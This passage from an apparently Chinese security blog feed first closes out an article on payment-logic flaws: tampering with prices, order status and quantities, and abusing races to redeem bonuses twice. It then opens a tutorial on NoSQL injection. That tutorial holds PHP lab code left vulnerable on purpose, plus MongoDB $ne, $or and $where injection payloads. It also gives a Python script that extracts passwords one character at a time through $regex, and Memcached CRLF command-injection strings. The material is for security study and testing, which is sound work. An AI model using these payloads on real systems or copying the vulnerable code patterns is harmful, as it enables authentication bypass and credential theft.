+<p><img src="https://img-blog.csdnimg.cn/20191112115712811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0196371.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0196371.html</a></p>
+<h3 id="0x06-支付逻辑"><a href="#0x06-支付逻辑" class="headerlink" title="0x06 支付逻辑"></a>0x06 支付逻辑</h3><h4 id="用户ID篡改"><a href="#用户ID篡改" class="headerlink" title="用户ID篡改"></a>用户ID篡改</h4><p>遍历用户ID，是否可查看其他用户信息</p>
+<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0111617.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0111617.html</a></p>
+<h4 id="修改支付价格"><a href="#修改支付价格" class="headerlink" title="修改支付价格"></a>修改支付价格</h4><p>抓包修改金额等字段，例如在支付页面抓取请求中商品的金额字段，修改成任意数额的金额并提交，查看能否以修改后的金额数据完成业务流程。</p>
+<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0117083.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0117083.html</a></p>
+<h4 id="修改支付状态"><a href="#修改支付状态" class="headerlink" title="修改支付状态"></a>修改支付状态</h4><p>没有对支付状态的值跟实际订单支付状态进行校验，导致点击支付时抓包修改决定支付或未支付的参数为支付状态的值从而达到支付成功。</p>
+<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0102292.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0102292.html</a></p>
+<h4 id="修改商品数量"><a href="#修改商品数量" class="headerlink" title="修改商品数量"></a>修改商品数量</h4><p>抓包修改商品数量等字段，将请求中的商品数量修改成任意数额，查看能否以修改后的数量完成</p>
+<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0120863.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0120863.html</a></p>
+<h4 id="越权支付"><a href="#越权支付" class="headerlink" title="越权支付"></a>越权支付</h4><p>生成订单，修改用户ID，实现跨用户付款</p>
+<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0174748.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0174748.html</a></p>
+<h4 id="多线程并发引起的支付漏洞"><a href="#多线程并发引起的支付漏洞" class="headerlink" title="多线程并发引起的支付漏洞"></a>多线程并发引起的支付漏洞</h4><p>例：<br>某游戏平台存在首充礼包，一个账户只能开通一次首充，这时会产生2重不同思路漏洞。<br>1.选择1元首充—-选择支付宝扫码支付—-弹出支付宝的付款码<br>这时，不要扫码付款，用此方法重放获取多个1元首充礼包支付宝支付界面。如果逻辑校验出错时，创建新订单时上一订单不会失效，依次同时付款，就会发现首充礼包不断到账。从而产生支付漏洞。<br>2.还有一种思路就是，某游戏平台的首充礼包里有1元6元两个挡位供用户选择，此时同时创建1元礼包和6元礼包2个付款码同时支付，如存在逻辑问题，两份礼包都会到账。</p>
+<h3 id="0x07-靶场实战"><a href="#0x07-靶场实战" class="headerlink" title="0x07 靶场实战"></a>0x07 靶场实战</h3><p>webug4.0 <a href="https://zhuanlan.zhihu.com/p/98035469" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/98035469</a></p>
+<p>pikachu <a href="https://zhuanlan.zhihu.com/p/101116258" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/101116258</a></p>
+<p>文章：<a href="https://www.cnblogs.com/ping007/p/10265764.html" target="_blank" rel="noopener">https://www.cnblogs.com/ping007/p/10265764.html</a></p>
+<p><a href="https://bloodzer0.github.io/vulnerability/logical-vulnerability/account/" target="_blank" rel="noopener">https://bloodzer0.github.io/vulnerability/logical-vulnerability/account/</a></p>
+<p><a href="https://wooyun.x10sec.org/search?keywords=验证码&content_search_by=by_bugs" target="_blank" rel="noopener">https://wooyun.x10sec.org/search?keywords=%E9%AA%8C%E8%AF%81%E7%A0%81&amp;content_search_by=by_bugs</a></p>
+<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0107127.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0107127.html</a></p>
+<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0183875.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0183875.html</a></p>
+<p><a href="http://w.hundan.org/search.php?content=短信验证码回传&start=1" target="_blank" rel="noopener">http://w.hundan.org/search.php?content=%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E5%9B%9E%E4%BC%A0&amp;start=1</a>.</p>
+<p><a href="https://websec.readthedocs.io/zh/latest/vuln/logic.html" target="_blank" rel="noopener">https://websec.readthedocs.io/zh/latest/vuln/logic.html</a></p>
+<p><strong><a href="https://mp.weixin.qq.com/s/R1npSjFwoY-J_v7RaJqjEw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/R1npSjFwoY-J_v7RaJqjEw</a></strong></p>
+<p><a href="https://www.jianshu.com/p/4d673e4ab5a7" target="_blank" rel="noopener">https://www.jianshu.com/p/4d673e4ab5a7</a></p>
+<p><strong><a href="https://mp.weixin.qq.com/s/ICaT3mHRanupyojkpZ31VQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ICaT3mHRanupyojkpZ31VQ</a></strong></p>
+<p><strong><a href="https://mp.weixin.qq.com/s/R1npSjFwoY-J_v7RaJqjEw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/R1npSjFwoY-J_v7RaJqjEw</a></strong></p>
+]]></content>
+      <categories>
+        <category>业务安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NoSql数据库getShell利用方法</title>
+    <url>/2020/06/23/NoSql%E6%95%B0%E6%8D%AE%E5%BA%93getShell%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gg29h2writj31c00u0e81.jpg" alt="36"></p>
+<a id="more"></a>
+
+<h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>​    网络已经成为了现代社会中的第五世界，而说起网络就不得不提起数据库,数据库作为存储信息的应用软件，已经深入到了各行各业，购物、外卖、银行、游戏、出行等，可以说只要是提供服务给用户使用的软件或者网站都离不开数据库的应用。而用的最多的是关系型数据库，例如：MYSQL、MSSQL、Oracle。而本文讲解的是非关系型数据库(NoSQL)，NoSQL数据库知道的最多的可能就是MongoDB、Redis、Memcached、Cassandra，但是你们知道NoSQL数据库还有那些吗？NoSQL的注入你们了解的多吗？NoSQL数据库中有哪些数据库是可getshell的？本文就带你了解一下什么是NoSQL数据库，NoSQL数据库的注入方法及getshell的方法。</p>
+<h3 id="0x01-NoSQL数据库特性"><a href="#0x01-NoSQL数据库特性" class="headerlink" title="0x01 NoSQL数据库特性"></a>0x01 NoSQL数据库特性</h3><p>​    NoSQL全称是Not Only SQL，意为不仅仅的SQL。是一种非关系型数据存储模式，它存储的不再是结构化数据，而是类型和固定的格式，以key-value键值对、列式、文档来存储。而相较于关系型数据库，非关系数据库的优点有如下几点：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、快速读写</span><br><span class="line">	主要例子有Redis，由于其逻辑简单，而且纯内存操作，使得其性能非常出色，单节点每秒可以处理超过10万次读写操作。</span><br><span class="line">2、方便扩展</span><br><span class="line">	NoSQL去掉关系数据库的关系型特性，很容易横向扩展，摆脱了以往老是纵向扩展的诟病。</span><br><span class="line">3、低廉成本</span><br><span class="line">	相较于关系型数据库来说，企业级授权费用降低很多。</span><br><span class="line">4、灵活的数据类型</span><br><span class="line">	NoSQL无需事先为要存储的数据建立字段，随时可以存储自定义的数据格式。</span><br></pre></td></tr></table></figure>
+
+<p>NoSQL数据库分类和特点如下：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggagqjf0fbj30th08yzmk.jpg" alt="image-20200630175238730"></p>
+<h3 id="0x02-Nosql数据库注入"><a href="#0x02-Nosql数据库注入" class="headerlink" title="0x02 Nosql数据库注入"></a>0x02 Nosql数据库注入</h3><p>NoSQL数据库虽然不使用SQL语句，但用网上的一句话来说，有DB的地方就有injection。且NoSQL注入的危害更大，因语句是以Web应用程序的语言来注入并在服务器上执行，从而导致允许任意代码执行，所以潜在影响要大于传统的SQL注入。</p>
+<p>NoSQL注入攻击流程(此图来源于owasp)</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnkiz8lkwj31ie0sedo6.jpg" alt="image-20200712015600235"></p>
+<p>NoSQL注入大概分为重言式、联合查询、Javascript、盲注、背负式查询、跨域违规等，由于背负式查询和跨域违规两种方式资料太少，也没有实战环境可测试，所以着重讲解前面几种注入方式。(此处使用MongoDB数据库来进行演示)</p>
+<p>准备测试数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">创建数据库</span><br><span class="line">use admin &#x2F;&#x2F;创建一个admin数据库,如果有admin数据库就选择admin数据库</span><br><span class="line">插入数据</span><br><span class="line">db.admin.insert(&#123;&#39;username&#39;:&#39;time&#39;,&#39;password&#39;:&#39;11111&#39;&#125;)&#x2F;&#x2F;默认会自动创建admin集合</span><br><span class="line">查询数据</span><br><span class="line">db.admin.find()&#x2F;&#x2F;查询所有数据</span><br><span class="line">查看所有数据库</span><br><span class="line">show dbs </span><br><span class="line">查看集合</span><br><span class="line">show collections</span><br></pre></td></tr></table></figure>
+
+<h4 id="1、重言式"><a href="#1、重言式" class="headerlink" title="1、重言式"></a>1、重言式</h4><p>又称永真式，既在条件语句中注入代码使其表达式判定结果永远为真，从而绕过认证或访问机制。而怎么使其注入代码后让表达式判定结果永远为真，此处就不得不说一下Mongodb数据库的条件操作符了。如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$eq : &#x3D;    	&#x2F;&#x2F;匹配字段值等于指定值的文档</span><br><span class="line">$gt : &gt;		&#x2F;&#x2F;匹配字段值大于指定值的文档</span><br><span class="line">$lt : &lt;		&#x2F;&#x2F;匹配字段值小于指定值的文档</span><br><span class="line">$gte: &gt;&#x3D;	&#x2F;&#x2F;匹配字段值大于等于指定值的文档</span><br><span class="line">$lte: &lt;&#x3D;	&#x2F;&#x2F;匹配字段值小于等于指定值的文档</span><br><span class="line">$ne : !&#x3D;	&#x2F;&#x2F;匹配字段值不等于指定值的文档，包括没有这个字段的文档</span><br><span class="line">$in : in	&#x2F;&#x2F;匹配字段值等于指定数组中的任何值</span><br><span class="line">$nin: not in	&#x2F;&#x2F;字段值不在指定数组或者不存在</span><br><span class="line">$and		&#x2F;&#x2F;文档至少满足其中的一个表达式</span><br><span class="line">$or:or		&#x2F;&#x2F;文档至少满足其中的一个表达式</span><br><span class="line">$not: 		&#x2F;&#x2F;反匹配(1.3.3及以上版本),字段值不匹配表达式或者字段值不存在</span><br><span class="line">模糊查询用正则式：db.customer.find(&#123;&#39;name&#39;: &#123;&#39;$regex&#39;:&#39;.*s.*&#39;&#125; &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>而在重言式注入中需要用到的就是$ne，意为不等于指定值的数据查询出来，表达式ne=1，就是把数据库中除ne=1的所有值，全部查询出来。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">"mongodb://localhost:27017"</span>);</span><br><span class="line">$uname = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询语句</span></span><br><span class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'uname'</span> =&gt; $uname,</span><br><span class="line">    <span class="string">'pwd'</span> =&gt; $pwd</span><br><span class="line">));</span><br><span class="line"><span class="comment"># 执行语句</span></span><br><span class="line">$result = $manager-&gt;executeQuery(<span class="string">'admin.admin'</span>, $query)-&gt;toArray();</span><br><span class="line">$count = count($result);</span><br><span class="line"><span class="keyword">if</span> ($count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        $user = ((<span class="keyword">array</span>)$user);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'username:'</span> . $user[<span class="string">'uname'</span>] . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'password:'</span> . $user[<span class="string">'pwd'</span>] . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not Found'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如图，此处输入对的账号密码查询出一条语句</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggkv7k8vhmj30nr03ot8x.jpg" alt="image-20200709174904553"></p>
+<p>如果输入以下代码，则会将数据库中所有的账户密码全部查询出来</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.239.135&#x2F;n&#x2F;login.php?username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1</span><br><span class="line">此处$ne是把数据库中$ne等于1之外的数据都查询出来</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggkv6kn97cj30lo05qjs0.jpg" alt="image-20200709174804855"></p>
+<p>如果输入username[$ne]=time&amp;password[$ne]=time111,会将账户不是time的所有数据显示。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnm5bfcgkj315e0cmq3s.jpg" alt="image-20200712025211991"></p>
+<p>当用户输入username[$ne]=1&amp;password[$ne]=1的时候，程序会将用户输入的账户密码构造成以下数据带入数据库中查询。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$query &#x3D; new MongoDB\Driver\Query(array(</span><br><span class="line">	&#39;uname&#39; &#x3D;&gt; array($ne &#x3D;&gt; 1),</span><br><span class="line">	&#39;pwd&#39; &#x3D;&gt; array($ne &#x3D;&gt; 1)</span><br><span class="line">));</span><br></pre></td></tr></table></figure>
+
+<p>数据库中查询出用户想要的数据</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnmlultjtj314a0jk0w2.jpg" alt="image-20200712030805742"></p>
+<h4 id="2、联合查询"><a href="#2、联合查询" class="headerlink" title="2、联合查询"></a>2、联合查询</h4><p>​    攻击者利用一个脆弱的参数去改变给定查询返回的数据集，最常用的用法是绕过认证页面获取数据。比如通过增加永真式的表达式利用布尔的OR运算符导致整个语句判定出错。(因没有找到测试环境，此处大概讲一下注入方式)</p>
+<p>小栗子：登录代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string query &#x3D; &quot;&#123; username:&#39;&quot; + post_username + &quot;&#39;, password:&#39;&quot; + post_passport + &#39; &quot; &#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>当我们登录账户时，正确的查询语句如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;‘username’:&#39;time&#39;,‘password’:&#39;time111&#39;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果构造一个恶意代码来忽略密码，那么就可以无需密码的情况下登录用户账号。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;time&#39;,$or:[&#123;&#125;,&#123;&#39;a&#39;:&#39;a&amp;password&#x3D;&#39;&#125;]</span><br><span class="line"></span><br><span class="line">构造的恶意语句</span><br><span class="line">&#123;&#39;username&#39;:&#39;time&#39;, &#39;$or&#39;:[&#123;&#125;,&#123;&#39;a&#39;:&#39;a&#39;,&#39;password&#39;:&#39;&#39;&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当将恶意语句带入数据库查询的时候匹配到当前用户的数据</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnqw0c15wj316e06i0u7.jpg" alt="image-20200712053615213"></p>
+<h4 id="3、JavaScript注入"><a href="#3、JavaScript注入" class="headerlink" title="3、JavaScript注入"></a>3、JavaScript注入</h4><p>新型注入漏洞，由允许执行数据内容中的javascript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事物和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，导致非法的数据获取或篡改。而Mongodb中的$where操作符就可以用来执行Javascript语句。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">"mongodb://localhost:27017"</span>);</span><br><span class="line">$query_body =<span class="keyword">array</span>(</span><br><span class="line"><span class="string">'$where'</span>=&gt;<span class="string">"function q() &#123;</span></span><br><span class="line"><span class="string">	var username = "</span>.$_REQUEST[<span class="string">"username"</span>].<span class="string">";</span></span><br><span class="line"><span class="string">	var password = "</span>.$_REQUEST[<span class="string">"password"</span>].<span class="string">";if(username == 'time'&amp;&amp;password == 'time111') return true; else&#123; return false;&#125;&#125;</span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query($query_body);</span><br><span class="line">$cursor = $manager-&gt;executeQuery(<span class="string">'test.test'</span>, $query)-&gt;toArray();</span><br><span class="line"><span class="keyword">if</span>(count($cursor)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"no"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当不知道账号密码的时候，在地址栏随意输入字符，页面返回错误</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggl8tuedj8j31p00cqwfi.jpg" alt="image-20200710014015410"></p>
+<p>当在参数后加上;return true;时页面返回ok</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggl8uvx2vsj31uc094wff.jpg" alt="image-20200710014115770"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：username&#x3D;1&amp;password&#x3D;1;return ture;</span><br><span class="line"></span><br><span class="line">当输入return ture;程序会构造出以下语句</span><br><span class="line">&#39;$where&#39;&#x3D;&gt;&quot;function q() &#123;</span><br><span class="line">	var username &#x3D; &quot;.$_REQUEST[&quot;username&quot;].&quot;;</span><br><span class="line">	var password &#x3D; &quot;.$_REQUEST[&quot;password&quot;].&quot;;</span><br><span class="line">	&#x2F;&#x2F;在此处添加一段代码，不管用户输入什么都返回ture</span><br><span class="line">	return ture;</span><br><span class="line">	if(username &#x3D;&#x3D; &#39;time&#39;&amp;&amp;password &#x3D;&#x3D; &#39;time111&#39;) return true; else&#123; return false;&#125;&#125;</span><br><span class="line">&quot;);</span><br><span class="line">带入数据库中查询成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggns7rphjij31hg08i76f.jpg" alt="image-20200712062208900"></p>
+<h4 id="4、盲注"><a href="#4、盲注" class="headerlink" title="4、盲注"></a>4、盲注</h4><p>NoSQL的盲注和SQL注入盲注类似，都是不返回数据，只是根据错误页面的返回来判断是否存在注入。此处我们需要用到的MongoDB的操作符来进行盲注$eq(等于)和$regex(正则匹配)</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mongo = <span class="keyword">new</span> mongoclient();</span><br><span class="line">$db = $mongo-&gt;test; <span class="comment">//选择数据库</span></span><br><span class="line">$coll = $db-&gt;users; <span class="comment">//选择集合</span></span><br><span class="line">$username = $_REQUEST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_REQUEST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_array($username)) &#123;</span><br><span class="line">    $data = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'username'</span>=&gt;$username);</span><br><span class="line">    $data = $coll-&gt;find($data);</span><br><span class="line">    <span class="keyword">if</span> ($data-&gt;count()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'yes'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'time no'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'time'</span>&amp;&amp;$password==<span class="string">'time111'</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ok'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'login no'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>随意输入字符，页面返回错误</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsoj1q10j30yi05k0t8.jpg" alt="image-20200712063815493"></p>
+<p>如果使用已知用户名为time，页面同样返回错误，而怎么才能确定账户是否正确，此时需要借助操作符$eq+burp，可以帮我们快速查找正确的账户。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnspqotjaj312c062t99.jpg" alt="image-20200712063925476"></p>
+<p>首先找一个字典，由于我本地环境，所以用了四个账户测试。抓包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：username[$eq]&#x3D;§1111§&amp;password&#x3D;111</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsx0ojetj31cw0qmjva.jpg" alt="image-20200712064625094"></p>
+<p>设置字典</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsy1hlnlj30s20ik764.jpg" alt="image-20200712064724308"></p>
+<p>可以看见，跑出两个正确的用户名。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsz0t6h2j31920sydj3.jpg" alt="image-20200712064820187"></p>
+<p>当确定了账号后，密码则使用正则匹配$regex来获取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;判断密码长度</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.3&#x2F;news.php?username[$eq]&#x3D;time&amp;password[$regex]&#x3D;.&#123;7&#125;</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.3&#x2F;news.php?username[$eq]&#x3D;time&amp;password[$regex]&#x3D;t.&#123;6&#125;</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.3&#x2F;news.php?username[$eq]&#x3D;time&amp;password[$regex]&#x3D;ti.&#123;5&#125;</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.3&#x2F;news.php?username[$eq]&#x3D;time&amp;password[$regex]&#x3D;tim.&#123;4&#125;</span><br><span class="line">以此类推</span><br><span class="line">数据库中查询语句会使用$regex和^</span><br><span class="line">&#123;&#39;username&#39;:&#123;&#39;$eq&#39;:&#39;time&#39;&#125;,&#39;password&#39;:&#123;&#39;$regex&#39;:&#39;^&#39;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggntbiy2e8j316g08a40m.jpg" alt="image-20200712070021751"></p>
+<p>而密码就有些复杂了，不能使用burp，不过可以借助脚本来测试。</p>
+<p>脚本:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib3</span><br><span class="line">import string</span><br><span class="line">import urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">username &#x3D; &#39;admin&#39;</span><br><span class="line">password &#x3D; &#39;&#39;</span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;mongo&#x2F;test.php&#39;</span><br><span class="line">while True:</span><br><span class="line">    for c in string.printable:</span><br><span class="line">        if c not in [&#39;*&#39;, &#39;+&#39;, &#39;.&#39;, &#39;?&#39;, &#39;|&#39;, &#39;#&#39;, &#39;&amp;&#39;, &#39;$&#39;]:</span><br><span class="line">            payload &#x3D; &#39;?username&#x3D;%s&amp;password[$regex]&#x3D;^%s&#39; % (username, password + c)</span><br><span class="line">            r &#x3D; requests.get(target + payload)</span><br><span class="line">            if &#39;OK&#39; in r.text:</span><br><span class="line">                print(&quot;Found one more char : %s&quot; % (password+c))</span><br><span class="line">                password +&#x3D; c</span><br></pre></td></tr></table></figure>
+
+<h4 id="5、背负式查询"><a href="#5、背负式查询" class="headerlink" title="5、背负式查询"></a>5、背负式查询</h4><p> 背负式查询是Memcached数据库的的一种注入，在php5.5的时候该漏洞被修复，所以网上资料较少，所以此处在网上摘抄了一部分作为了解。</p>
+<p>语法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set &lt;KEY&gt; &lt;FLAG&gt; &lt;EXPIRE_TIME&gt;   &lt;LENGTH&gt;,</span><br></pre></td></tr></table></figure>
+
+<p>当PHP配置的函数被调用时，接收参数如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$memcached-&gt;set(&#39;key&#39;, &#39;value&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>该驱动程序未能针对带有回车\r(0x0D)和换行的\n(0x0A)的ASCII码采取措施,导致攻击者有机会注入包含有键参数的新命令行和其他非计划内的命令到缓存中8。如下代码,其中的$param是用户输入并作为键来作用：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$memcached&#x3D;new Memcached(); $memcached -&gt;addServer(&#39;localhost&#39;,11211); $memcached-&gt;set($param, &quot;some value&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以提供以下输入进行注入攻击：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;key1 0 3600 4\r\nabcd\r\nset key2 0 3600 4\r\ninject\r\n&quot;</span><br></pre></td></tr></table></figure>
+
+<p>增加到数据库中的第一个键是具有”some value”值的key1。攻击者可以增加其他的、非计划内的键到数据库中,即带有”inject”值的key2。这种注入也可以发生在get命令上。看一下Memcached主页上的示例,它以这三行开头：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Function get_foo(foo_id) foo &#x3D; memcached_get(&quot;foo: &quot; . foo_id) return foo if defined foo</span><br></pre></td></tr></table></figure>
+
+<p>这个示例展示了Memcached的典型用法,在处理输入之前首先检查在数据库中是不是已经存在了。假设用类似代码检查从用户那里接收的认证令牌,验证他们是不是登录过了,那么就可以通过传递以下作为令牌的字符串来利用它:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;random_token\r\nset my_crafted_token 0 3600 4\r\nroot\r\n&quot;</span><br></pre></td></tr></table></figure>
+
+<p>当这个字符串作为令牌传递时,数据库将检查这个”random_token”是否存在,然后将添加一个具有”root”值的”my_crafted_token”。之后,攻击者就可以发送具有root身份的my_crafted_token令牌了。<br>可以被这项技术攻击的其他指令还有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">incr &lt;Key&gt; &lt;Amount&gt;</span><br><span class="line">decr &lt;Key&gt; &lt;Amount&gt;</span><br><span class="line">delete &lt;Key&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在此,incr用于增加一个键的值,decr用于缩减一个键的值,以及delete用于删除一个键。攻击者也可以用像set和get函数一样的手段来使用带来自己键参数的这三个函数。攻击者可以使用多条目函数进行同样的注入：deleteMulti、getMulti和setMulti,其中每一个键字段都可以被注入。回车换行注入可以被用于连接多个get请求。在一项我们进行的测试中,包括原始get在内最多可以连接17条。这样注入返回的结果是第一个键及其相应的值。</p>
+<h4 id="6、跨域违规"><a href="#6、跨域违规" class="headerlink" title="6、跨域违规"></a>6、跨域违规</h4><p>NoSQL数据库的另一个常见特点是，他们能够常常暴露能够从客户端应用进行数据库查询的HTTP REST API。暴露REST API 的数据库包括MongoDB、CouchDB和HBase。暴露REST API 就直接把数据库暴露给应用了，甚至是仅基于HTML5的应用，因为它不再需要间接的驱动程序了，让任何编程语言都可以在数据库上执行HTTP查询。这么做的优势非常明显，但这一特点是否伴随着安全风险？我们的回答是肯定的：这种REST API给跨站点请求伪造（CSRF）暴露了数据库，让攻击者绕过了防火墙和其他外围防御。</p>
